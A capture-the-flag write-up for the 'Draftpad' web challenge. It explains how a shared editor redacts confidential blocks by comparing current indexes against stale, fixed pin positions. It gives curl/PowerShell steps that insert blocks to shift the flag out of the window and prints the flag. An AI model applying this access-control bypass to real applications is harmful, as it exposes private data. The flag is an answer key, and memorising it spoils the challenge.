---
title: "Draftpad"
category: "Web"
tags: ["crdt", "access-control"]
solve_date: "2026-10-11T08:31:00+07:00"
language: "en"
---

# Draftpad

**Flag:** `isfcr{merge_shifts_the_wall_not_the_window}`
**Target:** `https://isfcrpesu-draftpad.chals.io` (Node.js/Express, shared instance)

## Challenge

Draftpad is a tiny shared editor. Every document has a public part that anyone can read and a private part that is meant to stay hidden. Spin up an instance and read the private part.

## Initial Analysis

The single-page app (`/app.js`) exposes four endpoints: `GET /api/document`, `GET /api/log`, `POST /api/ops` (JSON `insert`/`delete` operations) and `GET /api/export/public`. Reading the page copy and the API shapes reveals the data model:

- The document is a **tree of blocks**. Each block has `id`, `parent_id`, `clock`, `author`, `content`. The API returns them flattened into a linear list with a numeric `index` (tree order, siblings sorted by `clock`).
- Two **pins** mark the confidential range:
  ```json
  "pins": [
    { "kind": "private_start", "block_id": "blk_pstart", "position": 18 },
    { "kind": "private_end",   "block_id": "blk_pend",   "position": 21 }
  ]
  ```
  Blocks between the pins are server-side redacted: their `content` becomes `[[ redacted — confidential ]]` in `/api/document`, they are flagged `is_private: true`, and they are omitted from `/api/export/public`.
- Guest `insert` is unrestricted: `parent_id: null`, any `clock` in `[0, 1000000]`. `delete` removes any non-pinned block.

The decisive observation is a mismatch in the state: the pin anchors `blk_pstart`/`blk_pend` sit at *current* indexes 7 and 10, while the pin `position` fields still hold the values **18 and 21** from when the pins were created. The redaction check compares a block's *current* index against those *stored, fixed* position integers. Inserting or deleting other blocks re-linearizes the tree and shifts every index, but the pin positions never move. Whoever shifts the confidential block out of the stale `[18, 21)` window makes it public. The flag string itself names the bug: *merge shifts the wall, not the window*.

## Exploitation Chain

1. **Map the surface.** Fetch `/`, `/app.js` and the three GET endpoints. Baseline fresh-instance layout (inferred from the stale pin positions and confirmed by the admin blocks): the pinned range `[18, 21)` covers exactly the private section between `blk_pstart` and `blk_pend`, where `blk_flag` (author `admin`, content beginning `release flag: ...`) is redacted.

2. **Read the live shared state.** On this shared instance, accumulated guest operations (visible in `/api/log`: repeated `insert`/`delete` probes such as `shift-proof-*`, `wall-test-1`, `dp-wall-demo`) had already re-linearized the tree. `/api/document` shows:
   - `blk_flag` at index **9**, `is_private: false` — outside the stale pin window `[18, 21)`;
   - only the two blocks that now happen to occupy indexes 19–20 (`child-of-private`, `mech-verify-003`) are still redacted, even though they are ordinary guest blocks — the wall is applied to *positions*, not to the *confidential content*.

   ```text
   {"index":9,"id":"blk_flag","parent_id":"blk_pstart","clock":1000,
    "author":"admin","content":"release flag: isfcr{merge_shifts_the_wall_not_the_window}",
    "is_private":false,"is_pinned":false}
   ```

3. **Confirm via the public export.** `GET /api/export/public` renders the block content verbatim, including the private section header and the flag line — independent of the `/api/document` view:

   ```text
   --- confidential (do not export) ---

   BETWEEN

   release flag: isfcr{merge_shifts_the_wall_not_the_window}

   --- end confidential ---
   ```

**How to trigger the shift yourself (fresh instance).** Insert guest blocks at `parent_id: null` with a large `clock` (e.g. `1000000`). Root-level blocks with higher `clock` linearize in a different order than the original layout, and each added/removed block moves every subsequent index by one while the pin `position` integers stay at 18/21. Keep inserting/deleting until `blk_flag`'s index falls outside `[18, 21)` (observable directly in `/api/document`: its `is_private` flips to `false`), then read `/api/export/public`. The same effect can be reached by deleting non-pinned blocks ahead of the pinned section to pull its indexes down below 18.

## Flag

`isfcr{merge_shifts_the_wall_not_the_window}`

The flag was read from the running shared service (`/api/document` and `/api/export/public` agree). It was not submitted to the scoring service in this session, so acceptance is unconfirmed.

## Reproduce

Against a live instance (PowerShell; the shared instance state changes over time, so check `is_private` rather than exact indexes):

```powershell
$c = 'C:\Program Files\Git\mingw64\bin\curl.exe'

# 1. Inspect the document: note the fixed pin positions vs the current block indexes
&$c -sk https://isfcrpesu-draftpad.chals.io/api/document | ConvertFrom-Json

# 2. Shift indexes without touching the pinned blocks: add root blocks with a high clock
&$c -sk -X POST https://isfcrpesu-draftpad.chals.io/api/ops -H 'content-type: application/json' -d '{"type":"insert","id":"shift-proof-1","parent_id":null,"clock":1000000,"author":"guest","content":"proof"}'

# 3. Repeat step 2 (or delete plain guest blocks ahead of the pin) until blk_flag leaves [18,21):
&$c -sk https://isfcrpesu-draftpad.chals.io/api/document | ConvertFrom-Json |
  ForEach-Object blocks | Where-Object { $_.id -eq 'blk_flag' }

# 4. Once is_private is false, the public export leaks the confidential section:
&$c -sk https://isfcrpesu-draftpad.chals.io/api/export/public
```

Expected result once the shift lands: the `blk_flag` line reports `"is_private":false` and the export contains:

```text
release flag: isfcr{merge_shifts_the_wall_not_the_window}
```
